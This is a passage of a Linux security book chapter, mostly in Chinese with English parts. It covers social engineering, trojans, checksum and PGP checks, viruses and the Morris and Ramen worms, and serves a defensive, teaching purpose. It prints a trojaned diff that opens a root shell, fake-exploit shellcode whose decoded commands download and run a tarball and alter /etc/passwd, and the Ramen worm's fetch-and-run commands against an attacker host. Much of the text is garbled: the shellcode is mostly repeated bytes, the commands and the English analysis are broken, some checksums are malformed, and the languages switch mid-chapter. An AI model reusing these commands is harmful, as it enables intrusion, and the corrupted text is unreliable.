除非你完全确定自己在和谁交流，否则对你的所为和所说要非常小心。当某人在邮件中提出异常请求时，要求该人打电话给你确认。如果某人打给你电话，询问回拨号码并验证该号码是否正确。与陌生人面对面交谈时，要求查看身份证明。务要询问员工编号或其他标识符，以便你进行验证，并要求其主管验证该请求。

# 第4章：社会工程学、木马与其他黑客骗术

## 137

## 用户培训

用户教育是击败社会工程学攻击的关键。由于这些攻击针对的是公式中的人为因素，防止它们的唯一方法就是教育这些脆弱的碳基生命体本身。

## 黑客会做足准备

黑客在尝试任何社会工程攻击之前都会进行研究。他们会尽可能多地了解他们将互动的人，以及公司、公司结构和他们计划冒充的任何人。他们对所处场景越熟悉，就越可能欺骗他人。流行的信息收集工具包括：

- 员工目录：通常在公司主页上点击几次就能找到员工姓名、电子邮件地址、电话和部门名称的绝佳来源。
- 公司电话系统：某些系统包含按姓名拨号和员工列表，黑客可以从中获取真实的员工姓名，用于冒充或确定目标。
- 大堂目录：办公室号码、姓名、头衔和其他有用信息公开供任何人阅读。
- Usenet 帖子和邮件列表存档：黑客可以搜索源自目标公司域的电子邮件和帖子。他们不仅可以收集员工姓名，还能确定人们的兴趣并学习他们的写作风格。通常，帖子上的签名包含职位和联系信息。
- 在线数据库：电话号码和电子邮件地址的搜索非常快，且互联网上的许多地方是免费的。
- 主页：今天每个人似乎都有一个主页，在上面乐意地告诉你他们工作在哪里、在哪里上学、朋友在哪里以及他们喜欢什么食物。黑客只需直接从源头即可获取所需的所有信息。
- 公共 DNS 信息：搜索 Internic 数据库可以获得行政和技术联系信息以及电子邮件地址。

访问我们的网页 `www.hackinglinux.com` 获取用于信息收集的 URL 列表。

## 木马（TROJAN HORSES）

传说希腊人通过建造一装满士兵的大木马击败了特洛伊军队。特洛伊人相信木马来自神灵，将其带进城内，随后希腊士兵破马而出，剑光四闪。几千年后的今天我们发现这种骗术又复活了。

计算机时代的木马是指设计用于绕过你的机器安全但伪装成无害内容的程序。就像希腊的创造一样，计算机木马本身无法做任何事，必须依靠用户帮助它实现目标。在计算机语言中，“Trojan”一词有三种主要用法：

- 木马程序：一种伪装成某物但秘密绕过你安全防护的恶意程序。这是该词最常见的用法。
- 木马源代码：经过修改的程序源代码副本，其中包含某些后门或安全漏洞。
- 木马二进制文件：在攻击后，攻击者可能会将系统二进制文件替换为包含后门或隐藏其活动轨迹的版本。我们将在第10章中讨论这些。

木马通常以游戏、屏幕保护程序和其他感兴趣的项目的形式出现，并人与人之间自愿地传输。运行任何可执行文件都是一种风险。以下是你应该遵循的一些建议，以避免在你的机器上运行木马。

## 木马程序

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 10 |
| 风险等级 | 7 |

木马程序是黑客向你的机器上投放恶意代码最简单的方法之一。该程序通常是对用户有吸引力的东西，如游戏、屏幕保护程序、即时通讯软件或 MP3 播放器。然而，与诚实的程序不同，它还会包含某些创建或利用你系统中某些安全漏洞的功能。

当你在 Linux 中运行任何程序时，它都有访问你所做的任何内容的权限。因此，任何木马都有读取和写入你的文件、创建网络连接、发送电子邮件、尝试入侵其他机器以及运行任意命令。以 root 身份运行的木马可能完全控制该机器。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_169_0.png)

## 木马防御措施

- 永远不要运行来自不可信源的程序。互联网的匿名性使得很难确定他人的身份。很容易收到看起来来自任何电子邮件地址的邮件。确保当你收到某些东西时，务必核实它确实来自发件人。
- 在运行之前了解它是什么。如果你在运行之前知道它是什么。仅仅因为来源是你信任的人，并不意味着该程序就是你需要的。`/bin/rm` 可能是致命的，尽管它是一个合法的程序。
- 在 chroot 监狱中运行。首先在 chrooted 监狱中以虚拟用户运行程序。在决定正常运行它之前，观察它到底在做什么。
- 永远不要以 root 身份运行任何东西。以 root 身份运行外部程序允许它执行任何事情：补补内核、创建新用户、安装新软件。系统上的 root 代码应只在绝对必要时使用。
- 如果有疑问，思考一下。你收到的大多数值得运行的二进制文件可能已经在你的 Linux 发行版网站上以现成的安装包形式存在了。如果你收到一些尚未打包的东西，请索要源代码。

| 流行度 | 5 |
| :--- | :--- |
| 简单性 | 5 |
| 影响 | 9 |
| 风险等级 | 6 |

曾出现过代码被替换为木马版本的情况。最著名的木马代码发生在 1999 年 1 月 21 日，一名黑客将发行版中的 TCP wrapper 源代码替换为修改版本，允许任何连接到机器的人获得 root 权限。

# 第4章：社会工程学、木马及其他黑客诡计 141

```c
case 'A':
config.autodial = 1;
break;
-- 102,113 ---
char buffer[STRLEN];
int char;
while ((char = getopt(argc, argv, "RAa:btd:")) != EOF) {
  switch (char) {
  case 'R':
    setuid(0); setreuid(0);
    system("/bin/sh");
    break;
  case 'A':
    config.autodial = 1;
    break;
```

在这个示例中，通过展示一个虚构的煽动程序，黑客添加了一个新选项 `'R'`，设置后它将尝试将用户 ID 更改为 root 并运行命令提示符。在没有对代码进行全面审查的情况下，我们就能判断出丹麦王国内可能出了问题（引用自《哈姆雷》）。

黑客可能只对最新版本的代码植入木马，通过这种方式进行源代码对比通常会显示任何异常变化，这是仅次于实际代码审查的最佳方法。

## 验证加密校验和

校验和是由数学算法创建的字符串，允许你判断两个文件是否相同。即使文件中仅有一个位不同，也会导致你下载的校验和发生变化。通过将文件的校验和与分发站点进行比较，如果校验和匹配，你就可以相当确定文件是相同的。此外，当软件包中发现安全漏洞时，大多数 Linux 发行版会修复该漏洞，发布新版本，并向安全列表发送包含升级信息和新软件包校验和的邮件，如图 4-1 所示。

今天最常用的校验和是 MD5 校验和，称为消息摘要。这是目前使用的加密强度最强的校验和。要检查你的文件 `sourcecode.tgz` 的校验和，请使用 `md5sum` 程序：

```
machine$ md5sum sourcecode.tgz
fb6b5d19582621c4c5cf4c8488ac563 sourcecode.tgz
```

旧的校验和有多种类型，BSD 校验和和 System V 校验最为流行。这些校验和没有 MD5 校验和强，因为它们的输出长度短得多。要计算这些校验和，请使用 `sum` 程序：

```
# 使用 BSD 算法计算校验和
machine$ sum -r sourcecode.tgz
56656 1
```

```
# 使用 System V 算法计算校验和
machine$ sum -s sourcecode.tgz
36734 1
```

# 揭秘 Linux 安全：Linux 安全秘密与解决方案

> Debian 安全公告 DSA-016-1
> http://www.debian.org/security/
> 2001年1月23日



security@debian.org

Martin Schulze

软件包: `wu-ftpd`

漏洞：临时文件创建和格式化字符串

Debian 特有：否

我们建议你立即升级你的 `wu-ftpd` 软件包。

源存档：

- http://security.debian.org/dists/stable/updates/main/wu-ftpd_2.6.0.tar.gz

  MD5 校验和: `652ce4b59e046b8eded736c72981d16f`

- http://security.debian.org/dists/stable/updates/main/source/wu-ftpd_2.6.0-5.2.tar.gz

  MD5 校验和: `a6f3505372cbd5c5d32ce04047ff18576`

- http://security.debian.org/dists/stable/updates/main/source/wu-ftpd_2.6.0-5.2.diff.gz

  MD5 校验和: `af6e196640d429f400810aaf016d144c`

Intel i386 架构：

- http://security.debian.org/dists/stable/updates/main/binary-i386/wu-ftpd_2.6.0-5.2.i386.deb

  MD5 校验和: `5ccd2172e1b2459f11155cf034c91fe40`

图 4-1. 关于 `wu-ftpd` 的 Debian 安全公告部分

一旦你计算了校验和，请将其与软件分发站点列出的值或发布升级的邮件进行比较。如果它们不匹配，请勿编译或安装该软件。

如果你正在检查 rpm，也可以使用 rpm 工具内置的校验和功能：

```
machine$ rpm --checksum --noprogg program.rpm
program.rpm md5 OK
PGP Signatures
```

黑客创建一个具有给定校验和的文件是可能的。虽然 MD5 比较弱的 BSD 和 System V 校验和要安全得多，但这在理论上是可能的。然而，要让一个文件匹配两个或多个不同算法的校验和要困难指数级，甚至是不可能的。因此，你应该验证所有提供的校验和。

## 验证 PGP 签名

许多程序员使用优良隐私（PGP）密钥对他们的发行版进行数字签名。这会创建一个扩展名为 `.asc` 的独立文件，其作用与校验和类似。你必须先获取用于签名发行版的 PGP 公钥副本并将其安装到你的密钥环中。假设你的源代码是 `sourcecode.tgz`。

如果你的签名是 `sourcecode.asc`，使用：

```
machine$ pg sourcecode.asc
```

或者使用：

```
machine$ gpg --verify sourcecode.asc
```

许多 Linux 发行版使用 PGP 签名其 rpm。假设你已经将公钥导入密钥环，可以如下所示检查 rpm 的 PGP 签名：

```
machine$ rpm --check
```

# 揭秘 Linux 安全：Linux 安全秘密与解决方案

> CAUTION 校验和和 PGP 签名通常包含在发行版相同的目录下。如果你担心软件被黑客替换，你也应该担心校验和或签名可能被篡改。正因如此，校验和通常存储在其他地方，例如密钥服务器。检查密钥是否与服务器上的密钥匹配

## 木马交付方式

木马程序和木马源代码可以通过多种方式传递给你：

- 朋友：最常见的木马传播方式是通过朋友提供的，他们并不知道这些程序是危险的。只有在你相信他们有安全意识并信任他们 root 权限时信任。对于大多数安全专业人士来说，这最多包括两个人。请明智选择。
- Usenet 帖子：黑客确保其代码传播的一种简单方法是发布到 Usenet 群组。（如果程序声称包含或允许访问免费色情，这种方法似乎特别有效。）有时 Usenet 帖子会引用一个网页来下载软件——这额外好处是黑客可以查看下载木马代码的所有人的 IP 地址，更容易找到他们。
- 垃圾邮件：黑客有时会向大型邮件列表发送恶意代码，希望某些接收者运行它——大多数是互联网新用户。许多用户，那些盲目点击屏幕上出现的每一个 OK 按钮的人，会安装并运行，或者至少测试发送给他们的任何东西。
- 安全修复：当流行的软件中发现新漏洞（例如 FTP 服务器或 NFS 守护进程）时，各种安全新闻组和邮件列表会被相关信息淹没。偶尔，黑客会发布并没有实际修复问题的源代码修复程序，或者刻意开启另一个后门。这些问题可能非常微妙——专家通常会看到问题没有解决，并认为黑客只是程序员水平不高，而不是意识到这些副作用是故意的。
- 安全测试：与虚假的安全修复一样，黑客经常发布声称可以帮助判断你的机器是否受到威胁、安全漏洞的代码。实际上，提供的代码创建了安全泄露。黑客经常声称漏洞必须以 root 身份运行以测试漏洞，这让黑客的工作变得容易得多。

# 第 4 章：社会工程学、木马和其他黑客诡计

安全利用程序（Security exploits）当发现新漏洞时，通常会发布一个利用程序——即会破坏系统的实际代码。这些代码可以被管理员用于概念验证，但更常被那些无法自己编写利用程序的“脚本小子”（script-kies）使用。黑客经常会发布看似是针对某个漏洞的利用代码，但实际上那是针对运行该利用程序的机器发起的攻击。通常，只有那些正在获取未经授权访问的用户才会受到这些恶意程序的影响，这确实让我们露出了微笑。

## 虚假的利用脚本

以下是一个实际利用程序的代码，它在 gpopper（一个广泛使用的 POP 邮件服务器）发现漏洞后曾针对 Bugtrap 发布过：



/*
gpopper 2.51 的 Linux i86 利用代码。
你需要尝试不同的偏移量（`offsets`），
范围在 300 到 650 之间。

编译命令: `gcc -o popexp popexp.c`
使用方法: `popexp hostname offset`
*/

```
char shellcode[] = "\x03\x5e\x05\x68\xf8\xf1\xff\xc6\x0f\x31\x31\x69\x69\x69\x68\x88\x38\x30\x46\x36\x42\x64\xe8\x83\x33\x03\x02\x2d\x60\x60\x6b\x62\xd2\x71\x6a\x02\x71\x62\x01\x62\x92\x92\x92\x92\x92\x92\x92\x92\x92\x92\x92\x92\x62\x63\x63\x63\x63\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
```



```
int main() {

}
```

## Hacking Linux Exposed: Linux Security Secrets & Solutions

Scripts that perform buffer overflows commonly have such sections of machine code that is designed to test or exploit the vulnerability. Unless you analyzed this code, you may take the post at face value. Although slightly obfuscated (the actual code is XOR encoded), this exploit will actually run the following commands against your machine:

```
wget +com;
echo ' ' >>/root/.hosts;
echo /sbin/netstat -na /dev/null;
rm -rf h.tar;
echo >>/etc/passwd;
echo >>/etc/shadow;
wget h.tar -xf h.tar >dev/null;
sh/run.sh;
rm -rf
```



What does this append to `/.hosts` file, the hacker machine's configuration, add root-equivalent user to the password file (the password used above is 'get root'), and then retrieve a file from the Internet, untars. It then runs it and finally, removes the downloaded files. What it downloads with `wget` is anyone's guess, but likely to install backdoors or trojaned binaries or other useful information to the attacker.

## VIRUSES AND WORMS

In addition to trojan code, there are two main kinds of malicious programs that you should be aware of: viruses and worms.

Viruses are similar to trojans in that they do something to or on your machine that you don't want, without your knowledge or permission. A virus, once activated, will infect other programs or files on your computer with itself, whereas a trojan is simply a stand-alone program that cannot propagate itself. Neither viruses nor trojans can infect outside machines without assistance from a human.

A worm is a program that can infect the local machine and remote machines. It usually spreads itself from machine to machine by attacking or using other network programs or by using file-sharing capabilities of the computer. In other words, a worm spreads itself automatically, whereas a trojan must trick you into downloading and running it. Thus, worms have a much greater potential to damage machines, because they don't rely on the gullibility of users.

However most malicious programs in the wild are actually a hybrid of all three categories: trojan, virus, and worm. For example, the famous Melissa virus was a trojan (pretended to be an email you wanted, asking you to open it) and it infected all your local word processing files) and a worm (it used an insecurity in Microsoft Outlook to propagate it to all the people in your address book). People in the industry have lumped viruses and worms into one category under the name virus, although to be specific they should be virus/worm hybrids.

## 破解 Linux：Linux 安全秘密与解决方案

## Linux 有病毒吗？

目前已经为 Linux 创建了几个概念验证（POC）病毒；然而，它们只有在由 `root` 用户运行运行时才会传播，且无法传播到其他机器；它们只能感染其他本地安装（或通过 NFS 访问）的二进制文件。

Linux 与其他类 UNIX 操作系统一样，并不像单用户系统那样容易受到病毒攻击。也许未来会开发出 UNIX 病毒，但目前还没有。

我们遇到的唯一可以感染 Linux 的“病毒”是以下这些，包含在这封邮件中：

### 状态最糟糕的 Linux 病毒

收件人：任何人
发件人：一位朋友
主题：Linux 病毒

这种病毒根据信誉系统运行：

如果你正在运行任何变体的 Unix 或 Linux，请将此消息转发给你认识的每个人，并随机删除一些文件。

感谢你的配合。

--
嗨！我是一个签名病毒！
请将我复制到你的签名中，帮助我传播！

### Linux 病毒扫描软件如何？

有一些可以在 Linux 上运行的病毒扫描软件，你偶尔会听到它们。这些实际上是允许 Linux 机器检查 PC、Macintosh 和其他病毒的软件包，而不是为了检查 Linux 病毒。当 Linux 机器作为邮件服务器时，此类产品非常有用，例如可以让它扫描所有入站邮件。

## 蠕虫与 Linux

尽管 Linux 并不非常容易受到病毒，但它可能受到某类蠕虫的影响。过去已经编写了一些利用机器网络可访问漏洞，然后利用该机器攻击其他机器的蠕虫，它们可能对 Linux 机器产生巨大影响。

## 第 4 章：社会工程学、木马和其他黑客诡计

### 莫里斯网络蠕虫

最受关注的影响互联网机器的蠕虫案例发生在 1988 年 11 月。罗伯特·莫里斯（Robert Morris）创建了一个复杂的蠕虫，通过三种方式投送其感染代码来攻击可访问的主机：

- 使用 `rsh` 连接到机器
- 使 `fingerd` 中的缓冲区溢出
- 使用 `Sendmail` 的 `DEBUG` 方法欺骗机器在邮件消息中执行任意代码

该蠕虫的设计初仅仅是传播到未受感染的机器，通过读取 `.hosts`、`.host` 和 `.forward` 文件来确定要渗透的新机器名称。该蠕虫的设计并不是为了造成任何破坏。然而，代码中的几个逻辑错误阻止了它正确识别机器何时被感染，导致许多攻击代码副本同时运行，使得被感染的机器由于运行了多个攻击和感染代码副本而变得极其过载或完全无法使用。

超过 6,000 台机器被该蠕虫感染。考虑到该蠕虫仅设计用于攻击 VAX 和 SunOS 机器，并且考虑到 1988 年互联网上的主机数量与今天相比极少，这是一场令人震惊的虫害。

### 拉面蠕虫（Ramen Worm）

在过去的十多年时间里，没有出现过值得关注的 UNIX 蠕虫爆发。然后出现了拉面蠕虫，它以许多程序员喜欢的面条美食（包括我们这些谦虚的作者）命名命名。

拉面蠕虫于 2001 年 1 月 17 日出现。一些知名网站受到了感染：德克萨斯 A&M 立大学、NASA 喷气推进实验室以及位于台湾的电脑硬件厂商华微（Supermicro）。拉面蠕虫是由各种现有的攻击脚本拼凑而成的，虽然简单且笨肿，但非常有效。它的目标是 Red Hat 安装版，尽管如果创建者花更多时间，没有理由不把它做得更通用。其感染方法如下：

1. Ramen 使用 Synscan (`http://www.psychoid.lam3rz.de/synscan.html`) 连接到主机的 21 端口，并根据 FTP 横幅（banner）中报告的日期猜测 Red Hat 版本。这种检查是 Ramen 针对 Red Hat 的原因。

2. 如果 Ramen 确定机器运行的是 Red Hat 6.2，则它会攻击 `wfu-ftpd` 和 `rpc.statd`。如果机器运行的是 Red Hat 7.0，则它转而攻击 LPring 服务器。如果这些利用成功，它将在漏洞机器上以 `root` 身份运行以下命令：

```
mkdir /usr/src/.poop;cd /usr/src/.poop

export TERM=vt100

lynx -source http://IP_ADDR:27374 > /usr/src/.poop/ramen.tgz

p ramen.tgz /tmp

gzip -d ramen.tgz; -xvf ramen.tar.;./start.sh

echo Eat Your Ramen! | mail emailaddress
```



`lynx` 命令使用的 IP 地址是攻击机器的 IP。
结尾的电子邮箱地址是一个 Hotmail 账户。

3. `start.sh` 在端口 `27374` 上运行一个极简的 `HTTP/0.9` Web 服务器，根据情况使用 `inetd` 或 `xinetd`。此服务器用于提供自身的副本，正如执行的 `lynx` 命令所使用的 URL 所示。

4. Ramen 然后从新攻破的机器中移除 `rpc.statd` 或 `lpd`，再次取决于 Red Hat 版本。

5. 它将 `anonymous` 和 `ftp` 用户名添加到 `/etc/ftpusers`。

6. 蠕虫随后将任何名为 `index.html` 的文件替换为图 4-2 所示的消息：“Hackers loooooooooooooooove noodles”（黑客超超爱面条）。

拉面蠕虫值得注意的原因有很多：

- 它与其说是编写的，不如说是拼凑的。事实上，漏洞本身并不是写的。
- 当你读到这里时，你应该已经听了很多关于它的事。
- 唯一允许利用漏洞的因素不是新的，需要修补。
- 它的目标是 Red Hat 安装版，尽管如果创建者花更多时间，没有理由不把它做得更通用。

